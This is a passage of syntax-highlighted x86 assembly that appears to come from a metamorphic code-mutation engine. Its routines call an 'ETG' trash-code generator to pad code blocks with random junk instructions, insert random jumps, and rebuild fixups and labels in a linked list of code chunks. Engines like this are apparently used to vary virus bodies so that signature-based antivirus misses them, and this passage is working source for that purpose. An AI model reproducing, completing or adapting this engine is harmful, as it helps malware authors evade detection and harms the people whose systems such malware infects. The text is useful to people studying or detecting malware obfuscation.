                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cycle2</span><span class="sc0">

</span><span class="sc5">__done</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">hooy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">build</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; x4</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; x3</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; x2</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc2">12</span><span class="sc0">  </span><span class="sc1">; x1</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">user_random</span><span class="sc0">             </span><span class="sc1">; random()</span><span class="sc0">
                        </span><span class="sc5">pusho</span><span class="sc0">   </span><span class="sc5">my_trash</span><span class="sc0">                </span><span class="sc1">; trash()</span><span class="sc0">
                        </span><span class="sc5">pusho</span><span class="sc0">   </span><span class="sc5">my_fixup</span><span class="sc0">                </span><span class="sc1">; fixup()</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">regavail</span><span class="sc0">                </span><span class="sc1">; reg set</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_size</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; outbufsize</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">buf_ptr</span><span class="sc0">                 </span><span class="sc1">; bufptr</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">user_param</span><span class="sc0">              </span><span class="sc1">; user-param</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">codegen</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cg_err</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">cg_err</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cg_err</span><span class="sc0">

</span><span class="sc5">my_trash</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.v_saveebp</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; outptr</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__skip1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

</span><span class="sc5">__skip1</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; regfree</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">trasher</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; popa.eax</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; input: ECX=regset</span><span class="sc0">

</span><span class="sc5">trasher_avail</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regavail</span><span class="sc0">

</span><span class="sc5">trasher</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__retn</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">trasher_on</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__retn</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">

</span><span class="sc1">;                       mov     al, 90h</span><span class="sc0">
</span><span class="sc1">;                       stosb</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">etg_maxcmd</span><span class="sc0"> </span><span class="sc1">; calc # of commands</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc5">pusho</span><span class="sc0">   </span><span class="sc5">my_random</span><span class="sc0">       </span><span class="sc1">; external subroutine: rnd</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ptr to output buffer</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1024</span><span class="sc0">            </span><span class="sc1">; max size of buffer</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; max number of commands</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">etgsize</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; ptr to generated bufsize</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; regfree   ; REG_xxx (dest)</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">etg_srcreg</span><span class="sc0">      </span><span class="sc1">; REG_xxx (src)</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">etg_cmd</span><span class="sc0">         </span><span class="sc1">; ETG_xxx (cmd)</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">user_param</span><span class="sc0">      </span><span class="sc1">; user_param</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">etg_engine</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">etgsize</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">try_jmp</span><span class="sc0">

</span><span class="sc5">__retn</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">try_jmp</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">jmpprob</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__skipj</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__skipj</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">last_id</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">last_id</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">out_jmp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_hooy</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">__skipj</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">my_fixup</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.v_saveebp</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; outptr</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; fixup's value</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_fixup</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; popa.eax</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; input: buf_ptr, buf_size</span><span class="sc0">

</span><span class="sc5">flush_as_opcode</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_OPCODE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_CODE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_PRESENT</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_VPRESENT</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">flush</span><span class="sc0">

</span><span class="sc1">; input: buf_ptr, buf_size, EAX=fixup's value</span><span class="sc0">

</span><span class="sc5">flush_as_fixup</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_FIXUP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_CODE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_PRESENT</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_VPRESENT</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">flush</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">hooy_struc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; pusha.ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_size</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_datalen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_dataptr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__skip1</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_dataptr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">__skip1</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hooy</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">hooy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">; popa.ebx</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">out_jmp</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc5">out_5</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_OPCODE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_CODE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_HAVEREL</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_PRESENT</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_VPRESENT</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">out_call</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">out_5</span><span class="sc0">

</span><span class="sc5">flush_label</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_LABEL</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_CREF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_PRESENT</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_VPRESENT</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">init_etg</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc1">; select trash cmd set</span><span class="sc0">
</span><span class="sc5">__rr1</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">etg_cmd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ETG_ALL</span><span class="sc4">-</span><span class="sc5">ETG_SEG</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__rr2</span><span class="sc0">           </span><span class="sc1">; v1: all set</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_dword</span><span class="sc0">       </span><span class="sc1">; v0: random set</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc5">etg_cmd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__rr1</span><span class="sc0">
</span><span class="sc5">__rr2</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; trash: select src regs set</span><span class="sc0">
</span><span class="sc5">__xx1</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">etg_srcreg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__xx2</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_dword</span><span class="sc0">          </span><span class="sc1">; v1: random set</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc5">etg_srcreg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__xx1</span><span class="sc0">
</span><span class="sc5">__xx2</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; trash: max # of commands per chunk</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; 2..6</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
